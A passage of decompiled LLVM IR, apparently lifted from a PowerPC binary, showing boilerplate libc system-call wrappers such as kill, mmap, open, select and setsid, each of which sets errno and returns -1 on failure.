dec_label_pc_10018d7c:                            ; preds = %entry, %dec_label_pc_10018d70
  %v0_10018d8c = phi i32 [ %v0_10018d60, %entry ], [ -1, %dec_label_pc_10018d70 ]
  ret i32 %v0_10018d8c

; uselistorder directives
  uselistorder label %dec_label_pc_10018d7c, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018da8 = call i32 @__asm_mfcr()
  %v1_10018dac = and i32 %v0_10018da8, 268435456
  %v3_10018dac = icmp eq i32 %v1_10018dac, 0
  store i32 %v0_10018da8, i32* %r31.global-to-local, align 4
  br i1 %v3_10018dac, label %dec_label_pc_10018dc4, label %dec_label_pc_10018db8

dec_label_pc_10018db8:                            ; preds = %entry
  %v0_10018db8 = call i32 @__errno_location()
  %v0_10018dbc = load i32, i32* %r31.global-to-local, align 4
  %v2_10018dbc = inttoptr i32 %v0_10018db8 to i32*
  store i32 %v0_10018dbc, i32* %v2_10018dbc, align 4
  br label %dec_label_pc_10018dc4

dec_label_pc_10018dc4:                            ; preds = %entry, %dec_label_pc_10018db8
  %v0_10018dd4 = phi i32 [ %v0_10018da8, %entry ], [ -1, %dec_label_pc_10018db8 ]
  ret i32 %v0_10018dd4

; uselistorder directives
  uselistorder label %dec_label_pc_10018dc4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018df0 = call i32 @__asm_mfcr()
  %v1_10018df4 = and i32 %v0_10018df0, 268435456
  store i32 %v1_10018df4, i32* @r9, align 4
  %v3_10018df4 = icmp eq i32 %v1_10018df4, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10018df0, i32* %r31.global-to-local, align 4
  br i1 %v3_10018df4, label %dec_label_pc_10018e0c, label %dec_label_pc_10018e00

dec_label_pc_10018e00:                            ; preds = %entry
  %v0_10018e00 = call i32 @__errno_location()
  %v0_10018e04 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018e04 = inttoptr i32 %v0_10018e00 to i32*
  store i32 %v0_10018e04, i32* %v2_10018e04, align 4
  br label %dec_label_pc_10018e0c

dec_label_pc_10018e0c:                            ; preds = %entry, %dec_label_pc_10018e00
  %v0_10018e1c = phi i32 [ %v0_10018df0, %entry ], [ -1, %dec_label_pc_10018e00 ]
  ret i32 %v0_10018e1c

; uselistorder directives
  uselistorder label %dec_label_pc_10018e0c, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10018e24 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r10, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_10018e4c = call i32 @__asm_mfcr()
  %v1_10018e50 = and i32 %v0_10018e4c, 268435456
  %v3_10018e50 = icmp eq i32 %v1_10018e50, 0
  store i32 %v0_10018e4c, i32* %r31.global-to-local, align 4
  store i32 %v0_10018e4c, i32* %r0.global-to-local, align 4
  br i1 %v3_10018e50, label %dec_label_pc_10018e74, label %dec_label_pc_10018e64

dec_label_pc_10018e64:                            ; preds = %entry
  %v0_10018e64 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10018e6c = load i32, i32* %r31.global-to-local, align 4
  %v2_10018e6c = inttoptr i32 %v0_10018e64 to i32*
  store i32 %v0_10018e6c, i32* %v2_10018e6c, align 4
  %v0_10018e78.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10018e78

dec_label_pc_10018e74:                            ; preds = %entry
  %v3_10018e5c = icmp eq i32 %v0_10018e4c, 0
  br i1 %v3_10018e5c, label %dec_label_pc_10018e84, label %dec_label_pc_10018e78

dec_label_pc_10018e78:                            ; preds = %dec_label_pc_10018e74, %dec_label_pc_10018e64
  %v0_10018e78 = phi i32 [ %v0_10018e4c, %dec_label_pc_10018e74 ], [ %v0_10018e78.pre, %dec_label_pc_10018e64 ]
  store i32 %v0_10018e78, i32* @r4, align 4
  %tmp = icmp slt i32 %v0_10018e78, 0
  %v1_10018e7c = zext i1 %tmp to i32
  %v2_10018e7c = ashr i32 %v0_10018e78, 31
  %v3_10018e7c = and i32 %v2_10018e7c, -2
  %v4_10018e7c = or i32 %v3_10018e7c, %v1_10018e7c
  br label %dec_label_pc_10018e8c

dec_label_pc_10018e84:                            ; preds = %dec_label_pc_10018e74
  %v3_10018e84 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10018e8c

dec_label_pc_10018e8c:                            ; preds = %dec_label_pc_10018e78, %dec_label_pc_10018e84
  %v0_10018e9c = phi i32 [ %v4_10018e7c, %dec_label_pc_10018e78 ], [ %v3_10018e84, %dec_label_pc_10018e84 ]
  store i32 %v0_10018e24, i32* %r0.global-to-local, align 4
  ret i32 %v0_10018e9c

; uselistorder directives
  uselistorder i32 %v0_10018e78, { 2, 0, 1 }
  uselistorder i32 %v0_10018e4c, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10018e8c, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  %v1_10018eb8 = add i32 %arg1, 448
  %v2_10018eb8 = inttoptr i32 %v1_10018eb8 to i32*
  %v3_10018eb8 = load i32, i32* %v2_10018eb8, align 4
  %v3_10018ebc = icmp eq i32 %v3_10018eb8, 0
  br i1 %v3_10018ebc, label %dec_label_pc_10018ed4, label %dec_label_pc_10018ec4

dec_label_pc_10018ec4:                            ; preds = %entry
  %v1_10018ec8 = add i32 %arg1, 452
  store i32 268537556, i32* @lr, align 4
  %v3_10018ed0 = call i32 @__GI_sigprocmask(i32 2, i32 %v1_10018ec8, i32 0)
  %v0_10018ed4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018ed4

dec_label_pc_10018ed4:                            ; preds = %entry, %dec_label_pc_10018ec4
  %v0_10018ed4 = phi i32 [ %arg2, %entry ], [ %v0_10018ed4.pre, %dec_label_pc_10018ec4 ]
  %v3_10018ed4 = icmp eq i32 %v0_10018ed4, 0
  br i1 %v3_10018ed4, label %dec_label_pc_10018edc, label %dec_label_pc_10018ee0

dec_label_pc_10018edc:                            ; preds = %dec_label_pc_10018ed4
  br label %dec_label_pc_10018ee0

dec_label_pc_10018ee0:                            ; preds = %dec_label_pc_10018ed4, %dec_label_pc_10018edc
  %v0_10018ee4 = phi i32 [ %v0_10018ed4, %dec_label_pc_10018ed4 ], [ 1, %dec_label_pc_10018edc ]
  %v0_10018ee0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10018ee8 = inttoptr i32 %v0_10018ee0 to i32*
  %v3_10018ee8 = call i32 @__longjmp(i32* %v2_10018ee8, i32 %v0_10018ee4)
  ret i32 %v3_10018ee8

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10018ee0, { 1, 0 }
  uselistorder label %dec_label_pc_10018ed4, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018f04 = call i32 @__asm_mfcr()
  %v1_10018f08 = and i32 %v0_10018f04, 268435456
  %v3_10018f08 = icmp eq i32 %v1_10018f08, 0
  store i32 %v0_10018f04, i32* %r31.global-to-local, align 4
  br i1 %v3_10018f08, label %dec_label_pc_10018f20, label %dec_label_pc_10018f14

dec_label_pc_10018f14:                            ; preds = %entry
  %v0_10018f14 = call i32 @__errno_location()
  %v0_10018f18 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018f18 = inttoptr i32 %v0_10018f14 to i32*
  store i32 %v0_10018f18, i32* %v2_10018f18, align 4
  br label %dec_label_pc_10018f20

dec_label_pc_10018f20:                            ; preds = %entry, %dec_label_pc_10018f14
  %v0_10018f30 = phi i32 [ %v0_10018f04, %entry ], [ -1, %dec_label_pc_10018f14 ]
  ret i32 %v0_10018f30

; uselistorder directives
  uselistorder label %dec_label_pc_10018f20, { 1, 0 }
}

define i32 @mkdir(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018f4c = call i32 @__asm_mfcr()
  %v1_10018f50 = and i32 %v0_10018f4c, 268435456
  %v3_10018f50 = icmp eq i32 %v1_10018f50, 0
  store i32 %v0_10018f4c, i32* %r31.global-to-local, align 4
  br i1 %v3_10018f50, label %dec_label_pc_10018f68, label %dec_label_pc_10018f5c

dec_label_pc_10018f5c:                            ; preds = %entry
  %v0_10018f5c = call i32 @__errno_location()
  %v0_10018f60 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018f60 = inttoptr i32 %v0_10018f5c to i32*
  store i32 %v0_10018f60, i32* %v2_10018f60, align 4
  br label %dec_label_pc_10018f68

dec_label_pc_10018f68:                            ; preds = %entry, %dec_label_pc_10018f5c
  %v0_10018f78 = phi i32 [ %v0_10018f4c, %entry ], [ -1, %dec_label_pc_10018f5c ]
  ret i32 %v0_10018f78

; uselistorder directives
  uselistorder label %dec_label_pc_10018f68, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018f94 = call i32 @__asm_mfcr()
  %v1_10018f98 = and i32 %v0_10018f94, 268435456
  %v3_10018f98 = icmp eq i32 %v1_10018f98, 0
  store i32 %v0_10018f94, i32* %r31.global-to-local, align 4
  br i1 %v3_10018f98, label %dec_label_pc_10018fb0, label %dec_label_pc_10018fa4

dec_label_pc_10018fa4:                            ; preds = %entry
  %v0_10018fa4 = call i32 @__errno_location()
  %v0_10018fa8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018fa8 = inttoptr i32 %v0_10018fa4 to i32*
  store i32 %v0_10018fa8, i32* %v2_10018fa8, align 4
  br label %dec_label_pc_10018fb0

dec_label_pc_10018fb0:                            ; preds = %entry, %dec_label_pc_10018fa4
  %v0_10018fc0 = phi i32 [ %v0_10018f94, %entry ], [ -1, %dec_label_pc_10018fa4 ]
  ret i32 %v0_10018fc0

; uselistorder directives
  uselistorder label %dec_label_pc_10018fb0, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10018fdc = call i32 @__asm_mfcr()
  %v1_10018fe0 = and i32 %v0_10018fdc, 268435456
  %v3_10018fe0 = icmp eq i32 %v1_10018fe0, 0
  store i32 %v0_10018fdc, i32* %r31.global-to-local, align 4
  br i1 %v3_10018fe0, label %dec_label_pc_10018ff8, label %dec_label_pc_10018fec

dec_label_pc_10018fec:                            ; preds = %entry
  %v0_10018fec = call i32 @__errno_location()
  %v0_10018ff0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10018ff0 = inttoptr i32 %v0_10018fec to i32*
  store i32 %v0_10018ff0, i32* %v2_10018ff0, align 4
  br label %dec_label_pc_10018ff8

dec_label_pc_10018ff8:                            ; preds = %entry, %dec_label_pc_10018fec
  %v0_10019008 = phi i32 [ %v0_10018fdc, %entry ], [ -1, %dec_label_pc_10018fec ]
  ret i32 %v0_10019008

; uselistorder directives
  uselistorder label %dec_label_pc_10018ff8, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019024 = call i32 @__asm_mfcr()
  %v1_10019028 = and i32 %v0_10019024, 268435456
  %v3_10019028 = icmp eq i32 %v1_10019028, 0
  store i32 %v0_10019024, i32* %r31.global-to-local, align 4
  br i1 %v3_10019028, label %dec_label_pc_10019040, label %dec_label_pc_10019034

dec_label_pc_10019034:                            ; preds = %entry
  %v0_10019034 = call i32 @__errno_location()
  %v0_10019038 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019038 = inttoptr i32 %v0_10019034 to i32*
  store i32 %v0_10019038, i32* %v2_10019038, align 4
  br label %dec_label_pc_10019040

dec_label_pc_10019040:                            ; preds = %entry, %dec_label_pc_10019034
  %v0_10019050 = phi i32 [ %v0_10019024, %entry ], [ -1, %dec_label_pc_10019034 ]
  ret i32 %v0_10019050

; uselistorder directives
  uselistorder label %dec_label_pc_10019040, { 1, 0 }
}

define i32 @__libc_nanosleep() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001906c = call i32 @__asm_mfcr()
  %v1_10019070 = and i32 %v0_1001906c, 268435456
  %v3_10019070 = icmp eq i32 %v1_10019070, 0
  store i32 %v0_1001906c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019070, label %dec_label_pc_10019088, label %dec_label_pc_1001907c

dec_label_pc_1001907c:                            ; preds = %entry
  %v0_1001907c = call i32 @__errno_location()
  %v0_10019080 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019080 = inttoptr i32 %v0_1001907c to i32*
  store i32 %v0_10019080, i32* %v2_10019080, align 4
  br label %dec_label_pc_10019088

dec_label_pc_10019088:                            ; preds = %entry, %dec_label_pc_1001907c
  %v0_10019098 = phi i32 [ %v0_1001906c, %entry ], [ -1, %dec_label_pc_1001907c ]
  ret i32 %v0_10019098

; uselistorder directives
  uselistorder label %dec_label_pc_10019088, { 1, 0 }
}

define i32 @__libc_open() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_100190ac = load i32, i32* @r4, align 4
  %v1_100190ac = and i32 %v0_100190ac, 64
  %v3_100190ac = icmp eq i32 %v1_100190ac, 0
  br i1 %v3_100190ac, label %dec_label_pc_100190dc, label %dec_label_pc_100190c0

dec_label_pc_100190c0:                            ; preds = %entry
  %v2_100190c8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100190c8, i32* %stack_var_-32, align 4
  %v0_100190d8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_100190dc

dec_label_pc_100190dc:                            ; preds = %entry, %dec_label_pc_100190c0
  %v0_100190dc = phi i32 [ 0, %entry ], [ %v0_100190d8, %dec_label_pc_100190c0 ]
  store i32 %v0_100190dc, i32* @r5, align 4
  %v0_100190e4 = call i32 @__asm_mfcr()
  %v1_100190e8 = and i32 %v0_100190e4, 268435456
  %v3_100190e8 = icmp eq i32 %v1_100190e8, 0
  store i32 %v0_100190e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100190e8, label %dec_label_pc_10019100, label %dec_label_pc_100190f4

dec_label_pc_100190f4:                            ; preds = %dec_label_pc_100190dc
  %v0_100190f4 = call i32 @__errno_location()
  %v0_100190f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100190f8 = inttoptr i32 %v0_100190f4 to i32*
  store i32 %v0_100190f8, i32* %v2_100190f8, align 4
  br label %dec_label_pc_10019100

dec_label_pc_10019100:                            ; preds = %dec_label_pc_100190dc, %dec_label_pc_100190f4
  %v0_10019110 = phi i32 [ %v0_100190e4, %dec_label_pc_100190dc ], [ -1, %dec_label_pc_100190f4 ]
  ret i32 %v0_10019110

; uselistorder directives
  uselistorder label %dec_label_pc_10019100, { 1, 0 }
  uselistorder label %dec_label_pc_100190dc, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 577, i32* @r4, align 4
  %v0_10019120 = call i32 @__libc_open()
  ret i32 %v0_10019120
}

define i32 @__GI___libc_open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v1_10019130 = and i32 %arg1, 64
  %v3_10019130 = icmp eq i32 %v1_10019130, 0
  %v1_10019138 = or i32 %arg1, 65536
  store i32 %v1_10019138, i32* @r4, align 4
  br i1 %v3_10019130, label %dec_label_pc_10019160, label %dec_label_pc_10019144

dec_label_pc_10019144:                            ; preds = %entry
  %v2_1001914c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_1001914c, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10019160

dec_label_pc_10019160:                            ; preds = %entry, %dec_label_pc_10019144
  %v0_10019160 = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_10019144 ]
  store i32 %v0_10019160, i32* @r5, align 4
  store i32 268538220, i32* @lr, align 4
  %v0_10019168 = call i32 @__libc_open()
  ret i32 %v0_10019168

; uselistorder directives
  uselistorder label %dec_label_pc_10019160, { 1, 0 }
}

define i32 @__libc_pause(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019194 = call i32 @__asm_mfcr()
  %v1_10019198 = and i32 %v0_10019194, 268435456
  %v3_10019198 = icmp eq i32 %v1_10019198, 0
  store i32 %v0_10019194, i32* %r31.global-to-local, align 4
  br i1 %v3_10019198, label %dec_label_pc_100191b0, label %dec_label_pc_100191a4

dec_label_pc_100191a4:                            ; preds = %entry
  %v0_100191a4 = call i32 @__errno_location()
  %v0_100191a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100191a8 = inttoptr i32 %v0_100191a4 to i32*
  store i32 %v0_100191a8, i32* %v2_100191a8, align 4
  br label %dec_label_pc_100191b0

dec_label_pc_100191b0:                            ; preds = %entry, %dec_label_pc_100191a4
  %v0_100191c0 = phi i32 [ %v0_10019194, %entry ], [ -1, %dec_label_pc_100191a4 ]
  ret i32 %v0_100191c0

; uselistorder directives
  uselistorder label %dec_label_pc_100191b0, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100191dc = call i32 @__asm_mfcr()
  %v1_100191e0 = and i32 %v0_100191dc, 268435456
  %v3_100191e0 = icmp eq i32 %v1_100191e0, 0
  store i32 %v0_100191dc, i32* %r31.global-to-local, align 4
  br i1 %v3_100191e0, label %dec_label_pc_100191f8, label %dec_label_pc_100191ec

dec_label_pc_100191ec:                            ; preds = %entry
  %v0_100191ec = call i32 @__errno_location()
  %v0_100191f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100191f0 = inttoptr i32 %v0_100191ec to i32*
  store i32 %v0_100191f0, i32* %v2_100191f0, align 4
  br label %dec_label_pc_100191f8

dec_label_pc_100191f8:                            ; preds = %entry, %dec_label_pc_100191ec
  %v0_10019208 = phi i32 [ %v0_100191dc, %entry ], [ -1, %dec_label_pc_100191ec ]
  ret i32 %v0_10019208

; uselistorder directives
  uselistorder label %dec_label_pc_100191f8, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019224 = call i32 @__asm_mfcr()
  %v1_10019228 = and i32 %v0_10019224, 268435456
  %v3_10019228 = icmp eq i32 %v1_10019228, 0
  store i32 %v0_10019224, i32* %r31.global-to-local, align 4
  br i1 %v3_10019228, label %dec_label_pc_10019240, label %dec_label_pc_10019234

dec_label_pc_10019234:                            ; preds = %entry
  %v0_10019234 = call i32 @__errno_location()
  %v0_10019238 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019238 = inttoptr i32 %v0_10019234 to i32*
  store i32 %v0_10019238, i32* %v2_10019238, align 4
  br label %dec_label_pc_10019240

dec_label_pc_10019240:                            ; preds = %entry, %dec_label_pc_10019234
  %v0_10019250 = phi i32 [ %v0_10019224, %entry ], [ -1, %dec_label_pc_10019234 ]
  ret i32 %v0_10019250

; uselistorder directives
  uselistorder label %dec_label_pc_10019240, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001926c = call i32 @__asm_mfcr()
  %v1_10019270 = and i32 %v0_1001926c, 268435456
  %v3_10019270 = icmp eq i32 %v1_10019270, 0
  store i32 %v0_1001926c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019270, label %dec_label_pc_10019288, label %dec_label_pc_1001927c

dec_label_pc_1001927c:                            ; preds = %entry
  %v0_1001927c = call i32 @__errno_location()
  %v0_10019280 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019280 = inttoptr i32 %v0_1001927c to i32*
  store i32 %v0_10019280, i32* %v2_10019280, align 4
  br label %dec_label_pc_10019288

dec_label_pc_10019288:                            ; preds = %entry, %dec_label_pc_1001927c
  %v0_10019298 = phi i32 [ %v0_1001926c, %entry ], [ -1, %dec_label_pc_1001927c ]
  ret i32 %v0_10019298

; uselistorder directives
  uselistorder label %dec_label_pc_10019288, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100192b4 = call i32 @__asm_mfcr()
  %v1_100192b8 = and i32 %v0_100192b4, 268435456
  %v3_100192b8 = icmp eq i32 %v1_100192b8, 0
  store i32 %v0_100192b4, i32* %r31.global-to-local, align 4
  br i1 %v3_100192b8, label %dec_label_pc_100192d0, label %dec_label_pc_100192c4

dec_label_pc_100192c4:                            ; preds = %entry
  %v0_100192c4 = call i32 @__errno_location()
  %v0_100192c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100192c8 = inttoptr i32 %v0_100192c4 to i32*
  store i32 %v0_100192c8, i32* %v2_100192c8, align 4
  br label %dec_label_pc_100192d0

dec_label_pc_100192d0:                            ; preds = %entry, %dec_label_pc_100192c4
  %v0_100192e0 = phi i32 [ %v0_100192b4, %entry ], [ -1, %dec_label_pc_100192c4 ]
  ret i32 %v0_100192e0

; uselistorder directives
  uselistorder label %dec_label_pc_100192d0, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100192fc = call i32 @__asm_mfcr()
  %v1_10019300 = and i32 %v0_100192fc, 268435456
  %v3_10019300 = icmp eq i32 %v1_10019300, 0
  store i32 %v0_100192fc, i32* %r31.global-to-local, align 4
  br i1 %v3_10019300, label %dec_label_pc_10019318, label %dec_label_pc_1001930c

dec_label_pc_1001930c:                            ; preds = %entry
  %v0_1001930c = call i32 @__errno_location()
  %v0_10019310 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019310 = inttoptr i32 %v0_1001930c to i32*
  store i32 %v0_10019310, i32* %v2_10019310, align 4
  br label %dec_label_pc_10019318

dec_label_pc_10019318:                            ; preds = %entry, %dec_label_pc_1001930c
  %v0_10019328 = phi i32 [ %v0_100192fc, %entry ], [ -1, %dec_label_pc_1001930c ]
  ret i32 %v0_10019328

; uselistorder directives
  uselistorder label %dec_label_pc_10019318, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019344 = call i32 @__asm_mfcr()
  %v1_10019348 = and i32 %v0_10019344, 268435456
  %v3_10019348 = icmp eq i32 %v1_10019348, 0
  store i32 %v0_10019344, i32* %r31.global-to-local, align 4
  br i1 %v3_10019348, label %dec_label_pc_10019360, label %dec_label_pc_10019354

dec_label_pc_10019354:                            ; preds = %entry
  %v0_10019354 = call i32 @__errno_location()
  %v0_10019358 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019358 = inttoptr i32 %v0_10019354 to i32*
  store i32 %v0_10019358, i32* %v2_10019358, align 4
  br label %dec_label_pc_10019360

dec_label_pc_10019360:                            ; preds = %entry, %dec_label_pc_10019354
  %v0_10019370 = phi i32 [ %v0_10019344, %entry ], [ -1, %dec_label_pc_10019354 ]
  ret i32 %v0_10019370

; uselistorder directives
  uselistorder label %dec_label_pc_10019360, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001938c = call i32 @__asm_mfcr()
  %v1_10019390 = and i32 %v0_1001938c, 268435456
  %v3_10019390 = icmp eq i32 %v1_10019390, 0
  store i32 %v0_1001938c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019390, label %dec_label_pc_100193a8, label %dec_label_pc_1001939c

dec_label_pc_1001939c:                            ; preds = %entry
  %v0_1001939c = call i32 @__errno_location()
  %v0_100193a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100193a0 = inttoptr i32 %v0_1001939c to i32*
  store i32 %v0_100193a0, i32* %v2_100193a0, align 4
  br label %dec_label_pc_100193a8

dec_label_pc_100193a8:                            ; preds = %entry, %dec_label_pc_1001939c
  %v0_100193b8 = phi i32 [ %v0_1001938c, %entry ], [ -1, %dec_label_pc_1001939c ]
  ret i32 %v0_100193b8

; uselistorder directives
  uselistorder label %dec_label_pc_100193a8, { 1, 0 }
}

define i32 @sched_setscheduler() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100193d4 = call i32 @__asm_mfcr()
  %v1_100193d8 = and i32 %v0_100193d4, 268435456
  %v3_100193d8 = icmp eq i32 %v1_100193d8, 0
  store i32 %v0_100193d4, i32* %r31.global-to-local, align 4
  br i1 %v3_100193d8, label %dec_label_pc_100193f0, label %dec_label_pc_100193e4

dec_label_pc_100193e4:                            ; preds = %entry
  %v0_100193e4 = call i32 @__errno_location()
  %v0_100193e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100193e8 = inttoptr i32 %v0_100193e4 to i32*
  store i32 %v0_100193e8, i32* %v2_100193e8, align 4
  br label %dec_label_pc_100193f0

dec_label_pc_100193f0:                            ; preds = %entry, %dec_label_pc_100193e4
  %v0_10019400 = phi i32 [ %v0_100193d4, %entry ], [ -1, %dec_label_pc_100193e4 ]
  ret i32 %v0_10019400

; uselistorder directives
  uselistorder label %dec_label_pc_100193f0, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001941c = call i32 @__asm_mfcr()
  %v1_10019420 = and i32 %v0_1001941c, 268435456
  %v3_10019420 = icmp eq i32 %v1_10019420, 0
  store i32 %v0_1001941c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019420, label %dec_label_pc_10019438, label %dec_label_pc_1001942c

dec_label_pc_1001942c:                            ; preds = %entry
  %v0_1001942c = call i32 @__errno_location()
  %v0_10019430 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019430 = inttoptr i32 %v0_1001942c to i32*
  store i32 %v0_10019430, i32* %v2_10019430, align 4
  br label %dec_label_pc_10019438

dec_label_pc_10019438:                            ; preds = %entry, %dec_label_pc_1001942c
  %v0_10019448 = phi i32 [ %v0_1001941c, %entry ], [ -1, %dec_label_pc_1001942c ]
  ret i32 %v0_10019448

; uselistorder directives
  uselistorder label %dec_label_pc_10019438, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019464 = call i32 @__asm_mfcr()
  %v1_10019468 = and i32 %v0_10019464, 268435456
  %v3_10019468 = icmp eq i32 %v1_10019468, 0
  store i32 %v0_10019464, i32* %r31.global-to-local, align 4
  br i1 %v3_10019468, label %dec_label_pc_10019480, label %dec_label_pc_10019474

dec_label_pc_10019474:                            ; preds = %entry
  %v0_10019474 = call i32 @__errno_location()
  %v0_10019478 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019478 = inttoptr i32 %v0_10019474 to i32*
  store i32 %v0_10019478, i32* %v2_10019478, align 4
  br label %dec_label_pc_10019480

dec_label_pc_10019480:                            ; preds = %entry, %dec_label_pc_10019474
  %v0_10019490 = phi i32 [ %v0_10019464, %entry ], [ -1, %dec_label_pc_10019474 ]
  ret i32 %v0_10019490

; uselistorder directives
  uselistorder label %dec_label_pc_10019480, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100194ac = call i32 @__asm_mfcr()
  %v1_100194b0 = and i32 %v0_100194ac, 268435456
  %v3_100194b0 = icmp eq i32 %v1_100194b0, 0
  store i32 %v0_100194ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100194b0, label %dec_label_pc_100194c8, label %dec_label_pc_100194bc

dec_label_pc_100194bc:                            ; preds = %entry
  %v0_100194bc = call i32 @__errno_location()
  %v0_100194c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100194c0 = inttoptr i32 %v0_100194bc to i32*
  store i32 %v0_100194c0, i32* %v2_100194c0, align 4
  br label %dec_label_pc_100194c8

dec_label_pc_100194c8:                            ; preds = %entry, %dec_label_pc_100194bc
  %v0_100194d8 = phi i32 [ %v0_100194ac, %entry ], [ -1, %dec_label_pc_100194bc ]
  ret i32 %v0_100194d8

; uselistorder directives
  uselistorder label %dec_label_pc_100194c8, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100194f4 = call i32 @__asm_mfcr()
  %v1_100194f8 = and i32 %v0_100194f4, 268435456
  %v3_100194f8 = icmp eq i32 %v1_100194f8, 0
  store i32 %v0_100194f4, i32* %r31.global-to-local, align 4
  br i1 %v3_100194f8, label %dec_label_pc_10019510, label %dec_label_pc_10019504

dec_label_pc_10019504:                            ; preds = %entry
  %v0_10019504 = call i32 @__errno_location()
